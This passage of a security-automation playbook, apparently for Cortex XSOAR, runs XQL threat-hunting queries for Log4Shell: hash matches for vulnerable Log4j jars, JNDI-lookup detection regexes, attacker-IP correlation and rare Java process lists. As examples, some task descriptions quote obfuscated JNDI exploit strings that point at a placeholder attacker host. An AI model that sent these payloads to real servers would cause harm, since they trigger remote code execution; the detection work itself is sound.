          |filter event_type = NETWORK AND event_sub_type = NETWORK_STREAM_ACCEPT

          |alter rfc1918_172 = incidr(action_remote_ip, "172.16.0.0/12")

          |alter rfc1918_10 = incidr(action_remote_ip, "10.0.0.0/8")

          |alter rfc1918_192 = incidr(action_remote_ip, "192.168.0.0/16")

          |filter rfc1918_172 = false and rfc1918_10 = false and rfc1918_192 = false

          |comp count_distinct(action_remote_ip) as Count by agent_hostname

          ) as Count_External_IPs (Count_External_IPs.agent_hostname = agent_hostname )

          | filter Count >0
      query_name:
        simple: Search for process names "java" interacted with "log4j"
      time_frame:
        simple: 7 days
    separatecontext: false
    skipunavailable: false
    task:
      brand: ""
      description: Attempting to detect all Log4j jar loading - Trying to find all
        applications that utilize Log4j is nearly impossible, as it is bundled in
        a ton of different software.With that being said, we believe that this query
        will enable you to get at least a partial grip of this package usage within
        your environment.
      id: 095422b9-fd9a-485e-89f2-4f19d63949d3
      iscommand: true
      name: Search for process names "java" interacted with "log4j"
      script: '|||xdr-xql-generic-query'
      tags:
      - UserXQL
      type: regular
      version: -1
    taskid: 095422b9-fd9a-485e-89f2-4f19d63949d3
    timertriggers: []
    type: regular
    view: |-
      {
        "position": {
          "x": -790,
          "y": 2215
        }
      }
  "78":
    continueonerrortype: ""
    id: "78"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    nexttasks:
      '#none#':
      - "29"
    note: false
    quietmode: 2
    scriptarguments:
      query:
        simple: |-
          dataset = xdr_data
          | fields agent_hostname , action_file_sha256, action_file_path , actor_process_image_sha256 , actor_process_image_path , causality_actor_process_image_sha256 , causality_actor_process_image_path

          | filter action_file_sha256 in ("bf4f41403280c1b115650d470f9b260a5c9042c04d9bcc2a6ca504a66379b2d6", "58e9f72081efff9bdaabd82e3b3efe5b1b9f1666cefe28f429ad7176a6d770ae", "ed285ad5ac6a8cf13461d6c2874fdcd3bf67002844831f66e21c2d0adda43fa4", "dbf88c623cc2ad99d82fa4c575fb105e2083465a47b84d64e2e1a63e183c274e", "a38ddff1e797adb39a08876932bc2538d771ff7db23885fb883fec526aff4fc8", "7d86841489afd1097576a649094ae1efb79b3147cd162ba019861dfad4e9573b", "4bfb0d5022dc499908da4597f3e19f9f64d3cc98ce756a2249c72179d3d75c47", "473f15c04122dad810c919b2f3484d46560fd2dd4573f6695d387195816b02a6", "b3fae4f84d4303cdbad4696554b4e8d2381ad3faf6e0c3c8d2ce60a4388caa02", "dcde6033b205433d6e9855c93740f798951fa3a3f252035a768d9f356fde806d", "85338f694c844c8b66d8a1b981bcf38627f95579209b2662182a009d849e1a4c", "db3906edad6009d1886ec1e2a198249b6d99820a3575f8ec80c6ce57f08d521a", "ec411a34fee49692f196e4dc0a905b25d0667825904862fdba153df5e53183e0", "a00a54e3fb8cb83fab38f8714f240ecc13ab9c492584aa571aec5fc71b48732d", "c584d1000591efa391386264e0d43ec35f4dbb146cad9390f73358d9c84ee78d", "8bdb662843c1f4b120fb4c25a5636008085900cdf9947b1dadb9b672ea6134dc", "c830cde8f929c35dad42cbdb6b28447df69ceffe99937bf420d32424df4d076a", "6ae3b0cb657e051f97835a6432c2b0f50a651b36b6d4af395bbe9060bb4ef4b2", "535e19bf14d8c76ec00a7e8490287ca2e2597cae2de5b8f1f65eb81ef1c2a4c6", "42de36e61d454afff5e50e6930961c85b55d681e23931efd248fd9b9b9297239", "4f53e4d52efcccdc446017426c15001bb0fe444c7a6cdc9966f8741cf210d997", "df00277045338ceaa6f70a7b8eee178710b3ba51eac28c1142ec802157492de6", "28433734bd9e3121e0a0b78238d5131837b9dbe26f1a930bc872bad44e68e44e", "cf65f0d33640f2cd0a0b06dd86a5c6353938ccb25f4ffd14116b4884181e0392", "5bb84e110d5f18cee47021a024d358227612dd6dac7b97fa781f85c6ad3ccee4", "ccf02bb919e1a44b13b366ea1b203f98772650475f2a06e9fac4b3c957a7c3fa", "815a73e20e90a413662eefe8594414684df3d5723edcd76070e1a5aee864616e", "10ef331115cbbd18b5be3f3761e046523f9c95c103484082b18e67a7c36e570c", "dc815be299f81c180aa8d2924f1b015f2c46686e866bc410e72de75f7cd41aae", "9275f5d57709e2204900d3dae2727f5932f85d3813ad31c9d351def03dd3d03d", "f35ccc9978797a895e5bee58fa8c3b7ad6d5ee55386e9e532f141ee8ed2e937d", "5256517e6237b888c65c8691f29219b6658d800c23e81d5167c4a8bbd2a0daa3", "d4485176aea67cc85f5ccc45bb66166f8bfc715ae4a695f0d870a1f8d848cc3d", "3fcc4c1f2f806acfc395144c98b8ba2a80fe1bf5e3ad3397588bbd2610a37100", "057a48fe378586b6913d29b4b10162b4b5045277f1be66b7a01fb7e30bd05ef3", "5dbd6bb2381bf54563ea15bc9fbb6d7094eaf7184e6975c50f8996f77bfc3f2c", "c39b0ea14e7766440c59e5ae5f48adee038d9b1c7a1375b376e966ca12c22cd3", "6f38a25482d82cd118c4255f25b9d78d96821d22bab498cdce9cda7a563ca992", "54962835992e303928aa909730ce3a50e311068c0960c708e82ab76701db5e6b", "e5e9b0f8d72f4e7b9022b7a83c673334d7967981191d2d98f9c57dc97b4caae1", "68d793940c28ddff6670be703690dfdf9e77315970c42c4af40ca7261a8570fa", "9da0f5ca7c8eab693d090ae759275b9db4ca5acdbcfe4a63d3871e0b17367463", "006fc6623fbb961084243cfc327c885f3c57f2eba8ee05fbc4e93e5358778c85")

          | dedup agent_hostname , action_file_sha256, action_file_path , actor_process_image_sha256 , actor_process_image_path , causality_actor_process_image_sha256 , causality_actor_process_image_path
      query_name:
        simple: Detecting a files that matches the SHA256 hash of the Log4j vulnerable
          versions.
      time_frame:
        simple: 7 days
    separatecontext: false
    skipunavailable: false
    task:
      brand: ""
      description: Attempt to target all hosts that contain a file that matches the
        SHA256 hash of the Log4j vulnerable versions.
      id: 5406adcc-5ecb-4172-8b79-abb2c08597e5
      iscommand: true
      name: Detecting a files that matches the SHA256 hash of the Log4j vulnerable
        versions.
      script: '|||xdr-xql-generic-query'
      tags:
      - UserXQL
      type: regular
      version: -1
    taskid: 5406adcc-5ecb-4172-8b79-abb2c08597e5
    timertriggers: []
    type: regular
    view: |-
      {
        "position": {
          "x": -1230,
          "y": 2215
        }
      }
  "79":
    continueonerrortype: ""
    id: "79"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    nexttasks:
      '#none#':
      - "29"
    note: false
    quietmode: 2
    scriptarguments:
      query:
        simple: |-
          config case_sensitive = false timeframe=7d |
          dataset = xdr_data

          | filter lowercase(action_user_agent) ~= "((?:\%24\%7B|\$%7B|\$\{|\$[^//]+\{)(?:j|(?:\-|\}|\:|\:\-|\}|\:|\$)[^//]+j|(?:\-|\}|\:|\:\-|\}|\:|\$)j[^//]+|jn|jnd)(?:n|(?:\-|\}|\:|\:\-|\}|\:|\$)[^//]+n|(?:\-|\}|\:|\:\-|\}|\:|\$)n[^//]+|nd|ndi)?(?:d|(?:\-|\}|\:|\:\-|\}|\:|\$)[^//]+d|(?:\-|\}|\:|\:\-|\}|\:|\$)n[^//]+|di)(?:i|(?:\-|\}|\:|\:\-|\}|\:|\$)[^//]+i|(?:\-|\}|\:|\:\-|\}|\:|\$)i[^//]+))" OR lowercase(action_user_agent) ~= "\${jndi"

          | alter rfc1918_172 = incidr(action_remote_ip , "172.16.0.0/12")

          | alter rfc1918_10 = incidr(action_remote_ip, "10.0.0.0/8")

          | alter rfc1918_192 = incidr(action_remote_ip, "192.168.0.0/16")

          | filter (rfc1918_172 = false and rfc1918_10 = false and rfc1918_192 = false)

          | fields action_user_agent,agent_hostname, action_process_image_name, action_process_image_command_line
      query_name:
        simple: Detecting Potentially Malicious Activity Attributed with the Log4j
          Exploitation
      time_frame:
        simple: 7 days
    separatecontext: false
    skipunavailable: false
    task:
      brand: ""
      description: |-
        Section B: Detecting Potentially Malicious Activity Attributed with the Log4j Exploitation

        Given the sheer amount of obfuscation possible on the malicious User-Agents like:
        ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://${hostName}
        ${JnD${upper:i}:lda${env:XXXX2323:-p}:/
        ${jndi:ldap://host/$
        ${jndi:${lower:l}${lower:d}a${lower:p}:
        We’ve decided to choose a regular expression targeting all permutations of the potential resources.
      id: d34ebe10-b1e0-4e00-8d4a-8bd162c9722d
      iscommand: true
      name: Detecting Potentially Malicious Activity Attributed with the Log4j Exploitation
      script: '|||xdr-xql-generic-query'
      tags:
      - UserXQL
      type: regular
      version: -1
    taskid: d34ebe10-b1e0-4e00-8d4a-8bd162c9722d
    timertriggers: []
    type: regular
    view: |-
      {
        "position": {
          "x": -380,
          "y": 2215
        }
      }
  "80":
    continueonerrortype: ""
    id: "80"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    nexttasks:
      "no":
      - "29"
      "yes":
      - "81"
      - "82"
    note: false
    quietmode: 0
    scriptarguments:
      brandname:
        simple: Cortex XDR - XQL Query Engine
    separatecontext: false
    skipunavailable: false
    task:
      brand: ""
      description: Returns 'yes' if integration brand is available. Otherwise returns
        'no'
      id: f23a2b2d-e375-445d-8442-3a262b5b9c27
      iscommand: false
      name: Check if Cortex XDR - XQL Query Engine is Enabled
      script: IsIntegrationAvailable
      type: condition
      version: -1
    taskid: f23a2b2d-e375-445d-8442-3a262b5b9c27
    timertriggers: []
    type: condition
    view: |-
      {
        "position": {
          "x": 670,
          "y": 1900
        }
      }
  "81":
    continueonerrortype: ""
    id: "81"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    nexttasks:
      '#none#':
      - "79"
      - "77"
      - "78"
      - "86"
    note: false
    quietmode: 0
    separatecontext: false
    skipunavailable: false
    task:
      brand: ""
      id: 5b19b106-2fb6-435f-8773-261129ba0960
      iscommand: false
      name: Hunting for Log4Shell in Your Network
      type: title
      version: -1
    taskid: 5b19b106-2fb6-435f-8773-261129ba0960
    timertriggers: []
    type: title
    view: |-
      {
        "position": {
          "x": -1000,
          "y": 2070
        }
      }
  "82":
    continueonerrortype: ""
    id: "82"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    nexttasks:
      '#none#':
      - "84"
      - "85"
    note: false
    quietmode: 0
    separatecontext: false
    skipunavailable: false
    task:
      brand: ""
      id: 49d9b945-6e86-4586-8123-0fe8c99f7ba2
      iscommand: false
      name: Hunting for Log4Shell in Your Cloud Environment
      type: title
      version: -1
    taskid: 49d9b945-6e86-4586-8123-0fe8c99f7ba2
    timertriggers: []
    type: title
    view: |-
      {
        "position": {
          "x": 320,
          "y": 2070
        }
      }
  "84":
    continueonerrortype: ""
    id: "84"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    nexttasks:
      '#none#':
      - "29"
    note: false
    quietmode: 2
    scriptarguments:
      query:
        simple: |-
          dataset = cloud_audit_logs
          | alter raw_log_decoded = replace(replace(replace(lowercase(raw_log), "%7b", "{"), "%24","$"), "%7d", "}")

          | filter raw_log_decoded ~= "((?:\%24\%7B|\$%7B|\$\{|\$[^//]+\{)(?:j|(?:\-|\}|\:|\:\-|\}|\:|\$)[^//]+j|(?:\-|\}|\:|\:\-|\}|\:|\$)j[^//]+|jn|jnd)(?:n|(?:\-|\}|\:|\:\-|\}|\:|\$)[^//]+n|(?:\-|\}|\:|\:\-|\}|\:|\$)n[^//]+|nd|ndi)?(?:d|(?:\-|\}|\:|\:\-|\}|\:|\$)[^//]+d|(?:\-|\}|\:|\:\-|\}|\:|\$)n[^//]+|di)(?:i|(?:\-|\}|\:|\:\-|\}|\:|\$)[^//]+i|(?:\-|\}|\:|\:\-|\}|\:|\$)i[^//]+))" OR raw_log_decoded ~= "\${jndi"
          | fields caller_ip, project, identity_name, identity_type, identity_sub_type, operation_name_orig, operation_status, referenced_resource_name, caller_ip_asn_org, caller_ip_geolocation
      query_name:
        simple: Hunt additional exploitation attempts within cloud audit logs
      time_frame:
        simple: 7 days
    separatecontext: false
    skipunavailable: false
    task:
      brand: ""
      description: "Leveraging the exploitation upon API calls (as those API calls
        are usually logged) and their associated attributes controlled by the attacker
        such as the requests parameters of the API call or  the user-agent. \nFor
        example:\nCloud storage services, modify the object name:\nprojects/_/buckets/<BUCKET-NAME>/objects/${jndi:ldap://<ATTACKER-IP>:<PORT>/Exploit}\nUser
        agent:\n${jndi:${lower:l}${lower:d}a${lower:p}://<ATTACKER-DNS>.bin${upper:a}.io:<PORT>/callback}"
      id: 2e990128-bd28-47f7-80c7-a04ff3313337
      iscommand: true
      name: Hunt additional exploitation attempts within cloud audit logs
      script: '|||xdr-xql-generic-query'
      tags:
      - UserXQL
      type: regular
      version: -1
    taskid: 2e990128-bd28-47f7-80c7-a04ff3313337
    timertriggers: []
    type: regular
    view: |-
      {
        "position": {
          "x": 90,
          "y": 2215
        }
      }
  "85":
    continueonerrortype: ""
    id: "85"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    nexttasks:
      '#none#':
      - "29"
    note: false
    quietmode: 2
    scriptarguments:
      query:
        simple: |-
          dataset = cloud_audit_logs
          | alter raw_log_decoded = replace(replace(replace(lowercase(raw_log), "%7b", "{"), "%24","$"), "%7d", "}")

          | filter raw_log_decoded ~= "((?:\%24\%7B|\$%7B|\$\{|\$[^//]+\{)(?:j|(?:\-|\}|\:|\:\-|\}|\:|\$)[^//]+j|(?:\-|\}|\:|\:\-|\}|\:|\$)j[^//]+|jn|jnd)(?:n|(?:\-|\}|\:|\:\-|\}|\:|\$)[^//]+n|(?:\-|\}|\:|\:\-|\}|\:|\$)n[^//]+|nd|ndi)?(?:d|(?:\-|\}|\:|\:\-|\}|\:|\$)[^//]+d|(?:\-|\}|\:|\:\-|\}|\:|\$)n[^//]+|di)(?:i|(?:\-|\}|\:|\:\-|\}|\:|\$)[^//]+i|(?:\-|\}|\:|\:\-|\}|\:|\$)i[^//]+))" OR raw_log_decoded ~= "\${jndi"

          | filter lowercase(operation_name_orig) not contains "jobservice" and user_agent != null

          | alter ip = arrayindex(regextract(user_agent, "\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b"), 0)

          | filter ip != null

          | fields ip, user_agent, raw_log_decoded

          | join (dataset = xdr_data

          | filter action_remote_ip != null and (event_type = enum.STORY or event_type = enum.NETWORK)

          | fields action_remote_ip, cloud_entity, agent_id

          | alter cloud_instance_name = json_extract_scalar(to_json_string(cloud_entity), "$.entity_name")

          | dedup action_remote_ip, agent_id, cloud_instance_name) as remote_ips

          ip = remote_ips.action_remote_ip

          | fields ip, user_agent, agent_id, cloud_instance_name, raw_log_decoded
      query_name:
        simple: 'Hunt for successful exploitations by looking at EDR, Firewall and
          flow logs '
      time_frame:
        simple: 7 days
    separatecontext: false
    skipunavailable: false
    task:
      brand: ""
      description: |-
        Due to the fact that there are so many exploitation attempts, finding a successful exploitation is not an easy task. However, we can leverage the power of all XDR data resources and hunt those malicious connections.

        By correlating between Cortex XDR cloud, NDR and EDR logs, we are able to extract IOCs from exploitation attempts and match them with established outbound network connections.

        For example, we can extract the attacker IP address from the payload as seen in Cortex XDR cloud logs, and look for successful outbound connections to this IP address. The same steps can be implemented for DNS queries.
      id: 648ad59f-6dcc-4071-8e80-129c6b4d0185
      iscommand: true
      name: 'Hunt for successful exploitations by looking at EDR, Firewall and flow
        logs '
      script: '|||xdr-xql-generic-query'
      tags:
      - UserXQL
      type: regular
      version: -1
    taskid: 648ad59f-6dcc-4071-8e80-129c6b4d0185
    timertriggers: []
    type: regular
    view: |-
      {
        "position": {
          "x": 530,
          "y": 2215
        }
      }
  "86":
    continueonerrortype: ""
    id: "86"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    nexttasks:
      '#none#':
      - "29"
    note: false
    quietmode: 2
    scriptarguments:
      query:
        simple: |-
          config case_sensitive = false timeframe=90d |
          dataset = xdr_data

          | alter ct = current_time()

          | alter diff = timestamp_diff(ct, _time, "DAY")

          | filter event_type = ENUM.FILE

          and (

          actor_process_image_name contains "java"

          )

          and diff < 7

          | dedup action_process_image_command_line, agent_hostname, actor_process_image_name

          | fields action_file_path , action_file_name,agent_hostname, actor_process_image_name, action_process_image_name

          | join conflict_strategy = left type = left

          (

          dataset = xdr_data

          | filter event_type = ENUM.FILE

          and (

          actor_process_image_name contains "java"

          )

          | comp count(action_file_name) as Action_File_Days_count by actor_process_image_name

          ) as Three_Months_Action_Process (Three_Months_Action_Process.actor_process_image_name = actor_process_image_name)

          | join conflict_strategy = left type = left

          (

          dataset = xdr_data

          | filter event_type = ENUM.FILE

          and (

          actor_process_image_name contains "java"

          )

          | comp count(action_file_path) as Path_Days_count by actor_process_image_name

          ) as Three_Months_CommandLine (Three_Months_CommandLine.actor_process_image_name = action_process_image_name )

          | dedup agent_hostname ,actor_process_image_name , action_process_image_name

          | sort asc Path_Days_count , asc Action_File_Days_count

          | filter Path_Days_count < 10 and Action_File_Days_count <10
      query_name:
        simple: Creation of a list of the rare Java process
      time_frame:
        simple: 7 days
    separatecontext: false
    skipunavailable: false
    task:
      brand: ""
      description: |-
        Harness the power of “out of the ordinary”- The following query will create a list of the rare Java process causality chains for both action processes and their command lines.

        This means that for Java Child Process, the query will count the number of appearances over the past 90 days, and will list them only if they were spotted for less than 10 times on this specific host.

        Ideally, for any type of payload, you will be able to uncover any unusual processes and their commands.
      id: d84db7e7-8f80-43c8-837d-7d6e17623038
      iscommand: true
      name: Creation of a list of the rare Java process
      script: '|||xdr-xql-generic-query'
      tags:
      - UserXQL
      type: regular
      version: -1
    taskid: d84db7e7-8f80-43c8-837d-7d6e17623038
    timertriggers: []
    type: regular
    view: |-
      {
        "position": {
          "x": -1670,
          "y": 2210
        }
      }
  "87":
    continueonerrortype: ""
    id: "87"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    nexttasks:
      '#none#':
      - "69"
    note: false
    quietmode: 0
    separatecontext: false
    skipunavailable: false
    task:
      brand: ""
      id: e55cf5b0-cf5a-48ef-8f81-d38c4ca5f81a
      iscommand: false
      name: Hunt Linux OS
      type: title
      version: -1
    taskid: e55cf5b0-cf5a-48ef-8f81-d38c4ca5f81a
    timertriggers: []
    type: title
    view: |-
      {
        "position": {
          "x": 1520,
          "y": 1570
        }
      }
  "88":
    continueonerrortype: ""
    id: "88"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    nexttasks:
      '#none#':
      - "89"
    note: false
    quietmode: 0
    separatecontext: false
    skipunavailable: false
    task:
      brand: ""
      id: 95c2dc13-4a61-4fed-8961-caf12ca8cbaf
      iscommand: false
      name: Xpanse
      type: title
      version: -1
    taskid: 95c2dc13-4a61-4fed-8961-caf12ca8cbaf
    timertriggers: []
    type: title
    view: |-
      {
        "position": {
          "x": 2420,
          "y": 720
        }
      }
  "89":
    conditions:
    - condition:
      - - ignorecase: true
          left:
            iscontext: true
            value:
              complex:
                accessor: state
                filters:
                - - ignorecase: true
                    left:
                      iscontext: true
                      value:
                        simple: modules.brand
                    operator: containsString
                    right:
                      value:
                        simple: Xpanse
                root: modules
          operator: isEqualString
          right:
            value:
              simple: active
      label: "yes"
    continueonerrortype: ""
    id: "89"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    nexttasks:
      '#default#':
      - "37"
      "yes":
      - "90"
    note: false
    quietmode: 0
    separatecontext: false
    skipunavailable: false
    task:
      brand: ""
      description: Checks if Xpanse instance is enabled.
      id: 5d2aa5cb-f89b-448b-8bba-bd4473947fe7
      iscommand: false
      name: Is Xpanse enabled?
      type: condition
      version: -1
    taskid: 5d2aa5cb-f89b-448b-8bba-bd4473947fe7
    timertriggers: []
    type: condition
    view: |-
      {
        "position": {
          "x": 2420,
          "y": 850
        }
      }
  "90":
    continueonerrortype: ""
    id: "90"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    nexttasks:
      '#none#':
      - "91"
    note: false
    quietmode: 0
    scriptarguments:
      issue_type:
        simple: |-
          Adobe ColdFusion, Apache Solr, Cisco Identity Services Engine (ISE), Cisco Integrated Management Controller (IMC), Cisco Unified Communications Manager, Cisco Unified Computing System, Cisco Webex Meetings Server, Co-Located Elasticsearch Server, Dell Wyse Management Suite, Elasticsearch Server
          , Fortinet Device, IBM WebSphere Application Server, Java Application, Oracle E-Business Suite, Oracle Fusion Middleware, Palo Alto Networks Panorama Admin Login Page, SonicWall Email Security, VMware Carbon Black EDR, VMware vCenter, VMware vRealize Automation , , Appliance, VMware vRealize Suite Lifecycle Manager, VMware Workspace ONE Access Server
    separatecontext: false
    skipunavailable: false
    task:
      brand: ""
      description: Retrieve issues
      id: acb14015-2361-46c7-82c7-6729b7f05f7a
      iscommand: true
      name: Search for possible vulnerable servers
      script: '|||expanse-get-issues'
      type: regular
      version: -1
    taskid: acb14015-2361-46c7-82c7-6729b7f05f7a
    timertriggers: []
    type: regular
    view: |-
      {
        "position": {
          "x": 2670,
          "y": 1020
        }
      }
  "91":
    continueonerrortype: ""
    id: "91"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    nexttasks:
      '#none#':
      - "37"
    note: false
    quietmode: 0
    separatecontext: false
    skipunavailable: false
    task:
      brand: ""
      description: "Expander shows systems that are exposed to the public internet,
        without the need to install agents or sensors of any kind. Some of the systems
        below do not advertise version information, or are otherwise restricted from
        doing so depending on the configuration of our customers’ networks. Expander
        attempts to retrieve or derive version information, but this is not possible
        in all cases. \n\nXpanse issue IDs:\n${Expanse.Issue.id}"
      id: a145ebfd-196a-46c6-8513-07a912ed829a
      iscommand: false
      name: 'Review possible vulnerable servers '
      type: regular
      version: -1
    taskid: a145ebfd-196a-46c6-8513-07a912ed829a
    timertriggers: []
    type: regular
    view: |-
      {
        "position": {
          "x": 2670,
          "y": 1210
        }
      }
version: -1
view: |-
  {
    "linkLabelsPosition": {
      "22_26_Yes": 0.53,
      "22_37_#default#": 0.22,
      "24_25_Yes": 0.53,
      "24_37_#default#": 0.16,
      "32_29_#default#": 0.15,
      "32_33_yes": 0.45,
      "33_29_#default#": 0.24,
      "33_70_ALL": 0.65,
      "69_29_no": 0.17,
      "69_32_yes": 0.42,
      "75_29_#default#": 0.2,
      "80_29_no": 0.12,
      "80_81_yes": 0.29,
      "80_82_yes": 0.43,
      "89_37_#default#": 0.17,
      "89_90_yes": 0.59
    },
    "paper": {
      "dimensions": {
        "height": 5725,
        "width": 4720,
        "x": -1670,
        "y": -1290
      }
    }
  }
